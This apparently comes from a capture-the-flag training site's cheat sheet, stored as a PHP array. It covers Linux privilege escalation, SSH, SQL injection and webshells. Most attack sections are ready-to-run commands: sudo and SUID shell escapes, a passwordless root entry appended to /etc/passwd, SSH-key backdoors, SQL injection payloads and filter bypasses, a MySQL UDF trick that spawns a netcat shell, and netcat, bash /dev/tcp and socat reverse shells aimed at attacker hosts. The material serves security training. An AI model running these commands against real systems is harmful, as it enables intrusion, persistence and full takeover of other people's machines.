- List available tools: netcat, python, perl...
- Read all config, temporary, backup files to find login/password.<br/>
- Use the possible sudo rights of the account.<br/>
- Find commands with SetUID bit.<br/>
- Find a process running in the background with root rights and modify its inputs.<br/>
- Find a kernel exploit. This last option, radical because it can crash the machine, is very efficient on old servers...

On your first servers, it is preferable to make these enumerations by launching the commands manually, so you can appropriate the options and outputs. Once comfortable, and knowing what you are looking for, feel free to use scripts that do these enumerations for you.

',
  ),
  'PrivEscUx-section' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'section',
    'title' => 'Files containing usefull informations',
    'desc' => '## Files containing usefull informations

',
  ),
  'PrivEscUx-fichiers' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'fichiers',
    'title' => 'Find readables files',
    'desc' => '## Find readables files

Find .txt or .cfg files, owned by other accounts, and readable.
```
find /home -readable -type f  \\( -iname \\*.txt -o -iname \\*.cfg \\) 2>/dev/null
find /home -E . -regex \'.*\\.(txt|cfg)\' 2>/dev/null
```


',
  ),
  'PrivEscUx-wordpress' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'wordpress',
    'title' => 'Web app: Wordpress',
    'desc' => '## Web app: Wordpress

Wordpress config file is:
```
wp-config.php
```

Let find it:
```
find /var -name wp-config.php 2>/dev/null
```

This config file contains login/password used to connect to the blog database. By dumping the database, it\'s thus possible to get wordpress user\'s login and password hashes.

',
  ),
  'PrivEscUx-apache' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'apache',
    'title' => 'Web server: Apache',
    'desc' => '## Web server: Apache

Apache config file name may be :
```
httpd.conf
apache2.conf
```

On le trouve généralement dans un des répertoires:
```
/etc/apache2/httpd.conf
/etc/apache2/apache2.conf
/etc/httpd/httpd.conf
/etc/httpd/conf/httpd.conf
```


',
  ),
  'PrivEscUx-tomcat' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'tomcat',
    'title' => 'Web server: Tomcat',
    'desc' => '## Web server: Tomcat

Tomcat config file is named:
```
server.xml
```

User\'s accounts can be found in :
```
tomcat-users.xml
```

Thos files are usually found in:
```
TOMCAT-HOME/conf/
/usr/local/tomcat/conf/
```


',
  ),
  'PrivEscUx-sudo' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'sudo',
    'title' => 'Sudo',
    'desc' => '## Sudo

Sudo is used to run commands as another user.<br/>
<br/>
To know the sudo rights of your account, you have to run the command sudo -l. Sometimes you are asked to enter your password.
```
sudo -l
The user1 can use the following commands on target-host:
(ALL) NOPASSWD: /usr/bin/find
user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
```


The first entry is: (ALL) NOPASSWD: /usr/bin/find
It is possible to run the /usr/bin/find command as any server user, especially root.
```
sudo /usr/bin/find
```


Second entry is: user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
Here it is possible to run the command \'/usr/bin/python3 /home/user2/run.py\' as user2.
For this we use the \'sudo\' command with the \'-u user22\' flag
```
sudo -u user2 /usr/bin/python3 /home/user2/run.py
```


If the NOPASSWD option is set, you do not have to enter any passwords. Otherwise, the sudo command asks for the password of the current account. If you are logged in via a webshell, or an ssh connection with private key, you will have to figure out the password.

',
  ),
  'PrivEscUx-setUID' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'setUID',
    'title' => 'SetUID bits',
    'desc' => '## SetUID bits

Identify processes with a setUID bit
```
find / -perm -4000 -exec ls -al {} \\; 2>/dev/null
```

What to do with a binary having a setUID bit ?
```
- Run a shell
- Read a flag
- Copy a file
- Add an entry in a file : /etc/sudoers, /etc/passwd, ~/.ssh/authorized_keys
- ...
```


',
  ),
  'PrivEscUx-shell' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'shell',
    'title' => 'Process to allowing to launch a shell',
    'desc' => '## Process to allowing to launch a shell

Many processes allow to launch a shell. Perfect with sudo or a setUID bit.
```
- find
- nmap
- vi
- less
- awk
- tee
...
```

Reference: https://gtfobins.github.io/

',
  ),
  'PrivEscUx-less' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'less',
    'title' => 'Sudo/SUID bit - less',
    'desc' => '## Sudo/SUID bit - less

Less is used to read files. Press q to exit.
```
./less flag.txt
```

To open a shell, open a file, then !/bin/sh
```
./less fichier
!/bin/sh
```


',
  ),
  'PrivEscUx-privbash' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'privbash',
    'title' => 'Sudo/SUID bit - bash',
    'desc' => '## Sudo/SUID bit - bash

Launched thanks sudo or with SUID bit set, bash drops its privileges. To keep root id, use -p option.
```
bash -p
```


',
  ),
  'PrivEscUx-findsh' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'findsh',
    'title' => 'Sudo/SUID bit - find',
    'desc' => '## Sudo/SUID bit - find

To open a shell, find a known file then launch the command: /bin/sh.
```
sudo /usr/bin/find . -name readme.txt -exec /bin/sh \\;
./find . -name readme.txt -exec /bin/sh \\;

',
  ),
  'PrivEscUx-etcpasswd' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'etcpasswd',
    'title' => 'Add a password less account with root rights',
    'desc' => '## Add a password less account with root rights

If you have the rights to modify /etc/passwd, you can be root. For example tee with a sudo as root.
Add an entry with a UID of 0 (root UID), and an empty password.
```
echo myroot::0:0:::/bin/bash | sudo tee -a /etc/passwd
su myroot
```


',
  ),
  'PrivEscUx-pubkey' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'pubkey',
    'title' => 'Create an ssh backdoor by adding a public key.',
    'desc' => '## Create an ssh backdoor by adding a public key.

```
echo \'ssh-rsa AAAAB3[...]CHN2CpQ== yolo@yolospacehacker.com\' > /home/victim/.ssh/authorized_keys
ssh -i id_rsa victim@iptarget
```


',
  ),
  'PrivEscUx-ps' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'ps',
    'title' => 'ps',
    'desc' => '## ps

Identify processes running as root
```
ps eaxf
```

Once an interresting process found, see if it\'s possible to modify the files read by the process, or if the process has known vulnerabilities.

',
  ),
  'PrivEscUx-cron' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'cron',
    'title' => 'Cron',
    'desc' => '## Cron

Identify cron tasks.
```
cat /etc/cron.d/*
cat /var/spool/cron/*
crontab -l
cat /etc/crontab
cat /etc/cron.(time)
systemctl list-timers
```


',
  ),
  'PrivEscUx-process' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'process',
    'title' => 'Process Spy',
    'desc' => '## Process Spy

With the ps command, you may miss a small process, launched every 2 minutes, which will process a batch file in 5 seconds before disappearing.
The pspy tool monitors the processes for you.
```
https://github.com/DominicBreuker/pspy
```


',
  ),
  'PrivEscUx-os' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'os',
    'title' => 'Kernel exploit',
    'desc' => '## Kernel exploit

Linux Distib version:
```
cat /etc/issue
Ubuntu 18.04.3 LTS
```

Linux kernel version: 5.0.0-37-generic
```
uname -a
Linux yoloctf-server 5.0.0-37-generic #40~18.04.1-Ubuntu SMP Thu Nov 14 12:06:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

Once the kernel version is known, it is possible to search for a kernel exploit<br/>
https://github.com/SecWiki/linux-kernel-exploits<br/>
Never run an unknown binary !<br/>
Get the sources, read them, understand what they do, compile yourself, and only then run them... Knowing that there is a high risk of crashing the server.

',
  ),
  'PrivEscUx-linenum' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'linenum',
    'title' => 'Enum scripts',
    'desc' => '## Enum scripts

Some well known script automate the enumeration process.<br/>
Test them and find the one that suits you best.
```
linPeass : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
LinEnum.sh : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
linuxprivchecker.py : https://github.com/sleventyeleven/linuxprivchecker
unixprivesc.sh : https://github.com/pentestmonkey/unix-privesc-check
lse.sh : https://github.com/diego-treitos/linux-smart-enumeration
```



',
  ),
  'Shell-intro' => 
  array (
    'category' => 'Shell',
    'id' => 'intro',
    'title' => 'Shell',
    'desc' => '## Shell

Your terminal uses shell commands to manipulate the file system.
.
There are several shells, each with its own particularity.
We are looking at the most common one, the bash shell.
.
You are logged into an account, which you can get to know with the command id.
This account has rights, and belongs to groups.
With the command ls -al xxx, you display the rights of each file.
.
We will read every readable file belonging to other accounts and get valuables informations.
We will also try to get acces to other accounts.
The ultimate goal is to get the administrator\'s account (root).

',
  ),
  'Shell-commandes' => 
  array (
    'category' => 'Shell',
    'id' => 'commandes',
    'title' => 'Common shell commands',
    'desc' => '## Common shell commands

```
ls        : display the content of the current directory
ls -l     : display the contents of the current directory, with info on file permissions
ls -l xxx : display the rights of file xxx
ls -al    : display the contents of the current directory, including hidden files
cat xxx   : display the content of file xxx
pwd       : current directory
cd xxx    : move to the xxx directory
cd .      : move to parent directory
id        : identifier of the current account and groups it belongs to
uname -a  : server information: which distribution and kernel version.
```


',
  ),
  'Shell-flag_shell' => 
  array (
    'category' => 'Shell',
    'id' => 'flag_shell',
    'title' => 'Flag',
    'desc' => '## Flag

Some flags can be found in your terminal.<br/>
Start in the /home/yolo/flags directory before expanding to your entire system.<br/>
This is an opportunity to practice the commands detailed in this chapter.
And since you read the manual, here is a gift: Flag_rtfm_shell
```
cd ~/flags
```


',
  ),
  'Shell-dir' => 
  array (
    'category' => 'Shell',
    'id' => 'dir',
    'title' => 'Common directories',
    'desc' => '## Common directories

The Unix file system starts from the root: /<br/>
It usually contains the directories:
```
/home/xxx: one directory per user account xxx
~        : your user directory
/root    : the administrator\'s directory
/tmp     : temporary files
/bin     : system commands
/etc     : system configuration files
/var/log : logs of programs like the web server
/var/www : default location for web server files
```


',
  ),
  'Shell-shell-permissions' => 
  array (
    'category' => 'Shell',
    'id' => 'shell-permissions',
    'title' => 'Unix - File Permission',
    'desc' => '## Unix - File Permission
All files and directories have an owner, and are part of a group.
Each file therefore defines permissions for:
- User: the owner
- Group: users who are part of the group
- Other: users who are neither the owner nor in the group

Basic permissions are:
- Read: Read
- Write: Writing
- eXecute: Execution

Listing file rights
```
ls -al          : -al allows to list the rights of files, including hidden ones.
rwxr-xr--
\\ /\\ /\\ /
v  v  v
|  |  rights of other users (o)
|  |
|  rights of users belonging to the group (g)
|
owner\'s rights (u)
```

```
$ ls -al
total 192
drwxrwxr-x 18 yolo yolo 4096 janv. 25 14:23 .          : rights of the current directory
drwxrwxr-x 26 yolo yolo 4096 févr.  5 10:55 ..         : parent directory rights
-rw-rw-r--  1 yolo yolo 5917 janv. 25 14:23 readme.txt : read/write User/Group, read only for Other
-rwxr-xr-x  1 yolo yolo 2642 janv. 25 11:31 run        : read/write/execute for user, read/execute for group and others
```



Additional permissions exist:
- SUID: Set UID, the file is executed with the rights of its owner.
- SGID: Set GUID, the file is executed with the rights of its group.
- Sticky Bit: When this right is set on a directory, it prevents any user other than the owner of the file from deleting a file in the directory.

```
$ ls -al
total 192
drwxrwxr-x 18 yolo yolo 4096 janv. 25 14:23 .
drwxrwxr-x 26 yolo yolo 4096 févr.  5 10:55 ..
rwsr-xr-x  1 yolo yolo 2642 janv. 25 11:31 run        : the x is replaced by an s for User
```

The SUID bit allows us to launch commands with the rights of another user and make privilege elevation.

',
  ),
  'Shell-chmod' => 
  array (
    'category' => 'Shell',
    'id' => 'chmod',
    'title' => 'Set file permissions',
    'desc' => '## Set file permissions
The chmod command allows to add (+) or remove (-) the rights (r,w,x) to the owner (u), group (g), others (o) or all (a).
```
chmod u+x ./run  : the owner can execute
chmod g-x ./run  : the group can\'t execute
chmod o+r ./run  : others can read
chmod a+w ./run  : all can write in the file
```


Values of x,r,w can be set in binary form.
```
r=4, w=2, x=1

rwx = 4+2+1 = 7
r-x = 4+0+1 = 5
r-- = 4+0+0 = 4

rwxrx-r-- = 764
chmod 764 readme.txt
```


',
  ),
  'Shell-files' => 
  array (
    'category' => 'Shell',
    'id' => 'files',
    'title' => 'Usefull files',
    'desc' => '## Usefull files

```
/etc/passwd : users list
/etc/hosts : host names and aliases
```


',
  ),
  'Shell-find' => 
  array (
    'category' => 'Shell',
    'id' => 'find',
    'title' => 'find',
    'desc' => '## find
The find command is used to search for files in directories, and possibly to perform actions on the found files.
```
find . -name *.txt```

Search for files with the .txt extension in the current directory and subdirectories.
```
find / -name *.php```

Search for files with the .php extension from the root.
```
find / -name *.php 2&gt;/dev/null```

The screen is saturated with the list of directories that are forbidden to us to read. The command 2>/dev/null redirects the errors to the virtual file /dev/null which makes them disappear from the display.
```
find / -name *.php -exec ls {} \\; 2&gt;/dev/null```

The -exec option is used to run a command on each file found. Often ls -al, or cat.
{} is replaced by the name of the file found.
\\; is put at the end of the command to be executed.


',
  ),
  'Shell-find-exec' => 
  array (
    'category' => 'Shell',
    'id' => 'find-exec',
    'title' => 'find -exec',
    'desc' => '## find -exec
The find command is used to execute commands on found files.

```
find / -name *.txt -user yolo -exec cat {} \\; 2&gt;/dev/null```

Run the cat command on all .txt files belonging to yolo from the root.

___Syntax of the command:___
The {} is replaced by the name of the found files, and the \\; is used as the end-of-command delimiter for the command to be executed.

',
  ),
  'Shell-ssh' => 
  array (
    'category' => 'Shell',
    'id' => 'ssh',
    'title' => 'SSH',
    'desc' => '## SSH

Connections to the servers are done in ssh.<br/>
Either with a login/password
```
ssh user@hostname
```

Either with a private key file
```
ssh -i id_rsa user@hostname
```


',
  ),
  'Shell-sshidrsa' => 
  array (
    'category' => 'Shell',
    'id' => 'sshidrsa',
    'title' => 'SSH : Private / Public keys pairs',
    'desc' => '## SSH : Private / Public keys pairs

On servers, it is common to identify yourself with a private key rather than a password.
Your keys can be found in :
```
$ ls -al ~/.ssh
total 20
drwx------  2 yolo yolo 4096 Apr  4 13:47 .
drwxr-xr-x 27 yolo yolo 4096 Apr  4 13:22 ..
-rw-------  1 yolo yolo 2610 Apr  4 13:47 id_rsa
-rw-r--r--  1 yolo yolo  575 Apr  4 13:47 id_rsa.pub
-rw-r--r--  1 yolo yolo 1998 Apr  1 19:45 known_hosts
```

Your private keys are in the file :
```
~/.ssh/authorized_keys
```


',
  ),
  'Shell-sshidrsagen' => 
  array (
    'category' => 'Shell',
    'id' => 'sshidrsagen',
    'title' => 'SSH : Generate a private/public key pair',
    'desc' => '## SSH : Generate a private/public key pair

Generate a private/public key pair:<br/>
Just type [enter] to (empty for no passphrase) to generate a private key without a password.
If you enter a password, your key will be encrypted, and you will have to type the password every time you use it.
```
$ ssh-keygen -t rsa -b 4096 -C yolo@yoloctf.org -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:OSHYGRwrI7LM9/8haFfVXgBlXrdHcdfEZxIv9CeWg5Q yolo@yoloctf.org
The key\'s randomart image is:
+---[RSA 4096]----+
|     .o.   .+=o*O|
|     o.+   .Eo+=X|
|. . + = .  ..o*=*|
|oo . o . o. ...+o|
|.o .    S.   .   |
|  . . . ..       |
|     + o .       |
|    . o . .      |
|       ...       |
+----[SHA256]-----+
```

The private key file should only be readable by its owner.<br/>
If needed do: chmod 600 id_rsa.
```
vagrant@kali:/home/yolo/tmp$ ls -al
total 16
drwxrwxrwx  2 yolo      yolo   4096 Apr  4 13:24 .
drwxr-xr-x 27 yolo 		yolo   4096 Apr  4 13:22 ..
-rw-------  1 yolo      yolo   3381 Apr  4 13:24 id_rsa
-rw-r--r--  1 yolo      yolo    742 Apr  4 13:24 id_rsa.pub
```

Private key headers are easy to identify:
```
$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
7KrJLvv/4Ve+Dm5bLwhJ9BkLessiIlGgx0ju+ghI7V+Ar+qAhir5chpVSGH4YIk0J8VDbJ
...
O9mUtgl8PKUd5AQL6sMM/FaYffu7+OFQkJzv3hxyiFEQPhsAo2K55cG8S0RWCX9Jp96U54
lOXLj6MfGkfzuvvFS4pm9iTBrwKq8h7CubmNOnHe3TH3U/Mrzf6wq8MwAEpSeTWfnBGdRP
tHOBQdCIQj3JAAAAEHlvbG9AeW9sb2N0Zi5vcmcBAg==
-----END OPENSSH PRIVATE KEY-----
```

Password protected Key header:
```
$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25325A9B318F344B8391AFD767D6D

NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
```



Public key :
```
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQAxxxxx8/QoN3NBob3zs4l2mfZWkZNAtCHN2CpQ== yolo@yoloctf.org
```


',
  ),
  'Shell-sshidrsadechiffre' => 
  array (
    'category' => 'Shell',
    'id' => 'sshidrsadechiffre',
    'title' => 'SSH : Remove private key password',
    'desc' => '## SSH : Remove private key password

Once the password of a private key found with John, it is possible to remove it for simplicity.
```
openssl rsa -in [id_rsa_sec] -out [id_rsa]
```


',
  ),
  'Shell-sshidrsaauth' => 
  array (
    'category' => 'Shell',
    'id' => 'sshidrsaauth',
    'title' => 'SSH : Allow private key authentication',
    'desc' => '## SSH : Allow private key authentication

The public keys to connect in ssh are listed, one key per line, in the file.
```
~/.ssh/authorized_keys
```


Once on a user account of a server, inject your public key to have a direct access in ssh.
```
echo \'ssh-rsa AAAAB3xxxxxxtCHN2CpQ== yolo@yoloctf.org\' >> /home/victim/.ssh/authorized_keys
```

If the directory does not exist, just create it:
```
mkdir /home/victim/.ssh
chmod 700 /home/victim/.ssh
echo \'ssh-rsa AAAAB3xxxxxxtCHN2CpQ== yolo@yoloctf.org\' >> /home/victim/.ssh/authorized_keys
chmod 600 /home/victim/.ssh/authorized_keys
```

Close your webshell, and come back in ssh:
```
ssh -i id_rsa_yolo victim@target.com
```



',
  ),
  'sqli-intro' => 
  array (
    'category' => 'sqli',
    'id' => 'intro',
    'title' => 'SQLi',
    'desc' => '## SQLi


',
  ),
  'sqli-principe' => 
  array (
    'category' => 'sqli',
    'id' => 'principe',
    'title' => 'Principle',
    'desc' => '## Principle

Inject SQL commands in the parameters to rewrite the SQL query.
```
SELECT * FROM user WHERE login=\'[USER]\' and password=\'[PASSWORD]\';
```

Method : close the single quote \', whiden the SELECT with OR 1=1, add entries thanks to  UNION, comment the end of the request with # or -- -
```
Sent parameters:
USER=admin\' OR 1=1 -- -
PASSWORD=ferrari

Altered SQL request:
SELECT * FROM user WHERE login=\'admin\' OR 1=1 -- - and password=\'ferrari\';
```

Send the Form with custom params thanks to curl:
```
curl http://target/login.pgp?login=admin\' OR 1=1 -- -&password=ferrari
```


',
  ),
  'sqli-sqli-fun' => 
  array (
    'category' => 'sqli',
    'id' => 'sqli-fun',
    'title' => 'Exploits of a mom',
    'desc' => '## Exploits of a mom

<img src=\'https://imgs.xkcd.com/comics/exploits_of_a_mom.png\'>

',
  ),
  'sqli-sql-mysql' => 
  array (
    'category' => 'sqli',
    'id' => 'sql-mysql',
    'title' => 'MySQL/MariaDB - Commands',
    'desc' => '## MySQL/MariaDB - Commands

Connect to a remote mysql database:
```
mysql -u admin --host=10.10.12.10 : without password
mysql -u admin --host=10.10.12.10 -padmin : with password
```

Usefull commands:
```
SELECT @@version;
SELECT user();
SHOW Databases;
USE database;
SHOW tables;
SELECT * from table;
```


',
  ),
  'sqli-detect' => 
  array (
    'category' => 'sqli',
    'id' => 'detect',
    'title' => 'Detect SQLi',
    'desc' => '## Detect SQLi

Inject single quote \' or double quote " and see an error.<br/>
Inject Sleep and detect a delayed response.
```
admin\' and sleep(5) and \'1\'=\'1
admin" and sleep(5) and "1"="1
```


',
  ),
  'sqli-limit' => 
  array (
    'category' => 'sqli',
    'id' => 'limit',
    'title' => 'Select only one entry',
    'desc' => '## Select only one entry

Usually developers take the first entry. But sometimes they check that there is only one.
```
admin\' or 1=1 LIMIT 1 -- -
```


',
  ),
  'sqli-simplefilter' => 
  array (
    'category' => 'sqli',
    'id' => 'simplefilter',
    'title' => 'Bypass simple filters',
    'desc' => '## Bypass simple filters

Sometime, SQLi aware developpers filter characters such as space or words such as OR:
```
Space => Tab %09, Newline %A0, /**/
AND   => && %26%26
OR    => ||
```


',
  ),
  'sqli-union' => 
  array (
    'category' => 'sqli',
    'id' => 'union',
    'title' => 'Inject values using UNION',
    'desc' => '## Inject values using UNION

When the query is used to display entries (e.g. list of objects), values can be added with a UNION.<br/>.
First, you need to identify the number of entries used by SELECT:<br/>
```
SELECT id, name, desc, price FROM stock WHERE name=[NAME]
```

Methode 1: ORDER BY
```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 1-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 2-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 3-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 4-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' order by 5-- - : Error
=> 4 entries
```

Methode 2: SELECT
```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1 : Error
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2 : Error
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,3 : Error
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,3,4 : Ok
=> 4 entries
```


',
  ),
  'sqli-uniontablenames' => 
  array (
    'category' => 'sqli',
    'id' => 'uniontablenames',
    'title' => 'UNION: Table names',
    'desc' => '## UNION: Table names

```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,table_name,table_name FROM information_schema.tables; -- -
```


',
  ),
  'sqli-uniontablecolumnnames' => 
  array (
    'category' => 'sqli',
    'id' => 'uniontablecolumnnames',
    'title' => 'UNION: Table columns names',
    'desc' => '## UNION: Table columns names

```
SELECT id, name, desc, price FROM stock WHERE name=\'mouse\' UNION SELECT 1,2,column_name,column_name FROM information_schema.columns WHERE  table_name=\'users\'; -- -
```


',
  ),
  'sqli-sqlmap' => 
  array (
    'category' => 'sqli',
    'id' => 'sqlmap',
    'title' => 'SqlMap',
    'desc' => '## SqlMap

SQLi on GET parameter:
```
$ sqlmap -u \'http://10.10.10.129/sqli/example1.php?name=root\' --dbs --banner
```

SQLi on POST parameter:<br/>
Intercept the request using Burp, and save it in login.txt file.
```
$ sqlmap -r login.txt --dbs --banner
-p name : parameter to be tested
```

List tables, then dumper une table:
```
$ sqlmap -r login.txt -D jetadmin --tables
$ sqlmap -r login.txt -D jetadmin -T users --dump
```


',
  ),
  'sqli-mysqludf' => 
  array (
    'category' => 'sqli',
    'id' => 'mysqludf',
    'title' => 'MySQL: UDF User Defined Function',
    'desc' => '## MySQL: UDF User Defined Function

Compile a unix library containing the function sys_exec()<br/>
Uploader the .so file onto the server. Declare the function in MySQL. Now it\'s possible to use sys_exec() to run shell commands.
```
# Tested with : mysql 5.5.60-0+deb8u1
# Create a \'User Defined Function\' calling C function \'system\'
# Use pre-compiled 32 or 64 depending on target.
# Copy file to /tmp
create database exploittest;
use exploittest;
create table bob(line blob);
insert into bob values(load_file(\'/tmp/lib_mysqludf_sys.so\'));
select * from bob into dumpfile \'/usr/lib/mysql/plugin/lib_mysqludf_sys.so
create function sys_exec returns int soname \'lib_mysqludf_sys.so\';
select sys_exec(\'nc 11.0.0.21 4444 -e /bin/bash\');

select sys_exec(\'/bin/sh\');
after bash access, \'bash –p\' or \'sudo su\'
```



',
  ),
  'Webshell-intro' => 
  array (
    'category' => 'Webshell',
    'id' => 'intro',
    'title' => 'Web Shell',
    'desc' => '## Web Shell

Lignes de code à injecter dans des pages web pour lancer des commandes shell.

',
  ),
  'Webshell-ncprinciple' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncprinciple',
    'title' => 'Principle',
    'desc' => '## Principle

You have found a web request that allows you to execute commands on the server, or you have managed to find out how to upload a file that can be executed.<br/>
Your goal now is to get a shell on the machine, which will allow a comfortable exploitation.<br/>
You will use the tools installed on the server (netcat, bash, php, python, perl, ...) to open a shell on the server and connect it back to your host.

',
  ),
  'Webshell-nc' => 
  array (
    'category' => 'Webshell',
    'id' => 'nc',
    'title' => 'Netcat',
    'desc' => '## Netcat

Netcat, is the Swiss army knife of connections between servers.<br/>
It can listen, connect and launch shells.<br/>
<br/>
Older versions had the -e or -c option to launch a shell. Recent versions do not have this option anymore for security reasons.<br/>
On Kali there is a version 1.10 in :
```
/usr/bin/nc -h
-e shell commands : program to execute
-c shell commands : program to execute
-l                : listen mode
-v                : verbose
-p port           : local port number
```

Connect to port 3000 on 10.0.0.11 server:
```
/usr/bin/nc 10.0.0.11 3000
```


',
  ),
  'Webshell-ncreverse' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncreverse',
    'title' => 'Netcat - Reverse Shell (-e version)',
    'desc' => '## Netcat - Reverse Shell (-e version)

On your host, start a nc listening on 4444 port
```
nc -lvp 4444
```

On the target host, start a reverse shell. This reverse shell launch a shell and connect it to your host on 4444 port.
```
nc -e /bin/sh IPKALI 4444
```

To use a reverse shell you must have a public IP, and can\'t use a NAT.
Well, you can, its just little bit trickier.

',
  ),
  'Webshell-ncreversenoe' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncreversenoe',
    'title' => 'Netcat - Reverse Shell (without -e)',
    'desc' => '## Netcat - Reverse Shell (without -e)

On your host, start a nc listening on 4444 port
```
nc -lvp 4444
```

On the target host, start a reverse shell. This reverse shell launch a shell and connect it to your host on 4444 port.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f
```


',
  ),
  'Webshell-ncupgrade' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncupgrade',
    'title' => 'Upgrade your nc shell to a tty',
    'desc' => '## Upgrade your nc shell to a tty

The shell obtained with nc is basic. It is not a tty (real terminal).<br/>
Some commands like su will refuse to work.<br/>
To upgrade our shell, use python to get a tty shell:
```
python -c \'import pty; pty.spawn(&quot/bin/bash&quot)\'
```


',
  ),
  'Webshell-ncupgrade2' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncupgrade2',
    'title' => 'Upgrade your shell with history and completion',
    'desc' => '## Upgrade your shell with history and completion

The shell obtained with nc is basic. The completion with Tab, the history with arrows are not managed.<br/>
<br/>
Put the nc in the background with:
```
Ctr-Z
```

Then ask the current shell to pass the raw keystroke codes to the remote shell, and switch back to the netcat (foreground)
```
stty raw -echo
fg
```

Disclamer: Trying this in a browser will just freeze the shell. The browser also modifies the key codes. It only works in a VM

',
  ),
  'Webshell-ncwebfriendly' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncwebfriendly',
    'title' => 'Friendly Webshell',
    'desc' => '## Friendly Webshell

As long as your nc is connected, you block a thread of the web server.
Depending on the configuration of the server, it can have 6, 16, 32 threads... This means as many nc in parallel before saturation.
To free the server for friends:
In the connected nc, choose a second port and launch a second netcat bindshell in the background:```
binshell:
nohup bash -c \'while true; do nc -e /bin/bash -lvp 4445; done;\' &

reverse shell:
nohup bash -c \'bash -i >& /dev/tcp/IPKALI/4444 0>&1\' &
```

The nohup command will detach the nc process from the current shell.
Do a Ctrl-C to cut the nc connection, the page with your webshell will be freed. Another user can connect.
Launch a new nc to connect to this new bindshell.

',
  ),
  'Webshell-ncbind' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncbind',
    'title' => 'Netcat - Bind shell',
    'desc' => '## Netcat - Bind shell

A bind shell is useful when our host is behind a NAT.
This shell is fragile, a port scan will trigger it and close it.
Launch a shell, open a listening TCP socket on port 4444, and give access to the shell to the first one who connects.
```
nc -e /bin/sh -lvp 4444
```

Connect to the nc on the target and get the shell:
```
nc iptarget 4444
```


',
  ),
  'Webshell-ncbindnoe' => 
  array (
    'category' => 'Webshell',
    'id' => 'ncbindnoe',
    'title' => 'Netcat - Bind Shell (without -e option)',
    'desc' => '## Netcat - Bind Shell (without -e option)

Launch a bind shell on the target host
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f
```

Then connect to it
```
nc victim 4444
```


',
  ),
  'Webshell-socat' => 
  array (
    'category' => 'Webshell',
    'id' => 'socat',
    'title' => 'Shell: Socat',
    'desc' => '## Shell: Socat

Socat is a nc on steroids. It allows authentication, encryption of communications and port forwarding.<br/>
It is rarely found on the servers, it must be uploaded.<br/>
Start a listening socat:
```
$ socat file:`tty`,raw,echo=0 TCP-L:4444
```

Launch reverse shell back to 10.0.0.1:4444
```
$ /tmp/socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
```

Automate socat upload and the reverse shell:
```
$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```


',
  ),
  'Webshell-pwncat' => 
  array (
    'category' => 'Webshell',
    'id' => 'pwncat',
    'title' => 'Shell: Pwncat',
    'desc' => '## Shell: Pwncat

Pwncat is an upgraded nc on steroids too.
```
https://github.com/cytopia/pwncat
```


',
  ),
  'Webshell-bash' => 
  array (
    'category' => 'Webshell',
    'id' => 'bash',
    'title' => 'Reverse shell: Bash',
    'desc' => '## Reverse shell: Bash

Netcat and python are not installed on the server. It is still possible to launch a reverse shell in bash.<br/>
Launch a listening nc on your host:
```
nc -lvp 4444
```
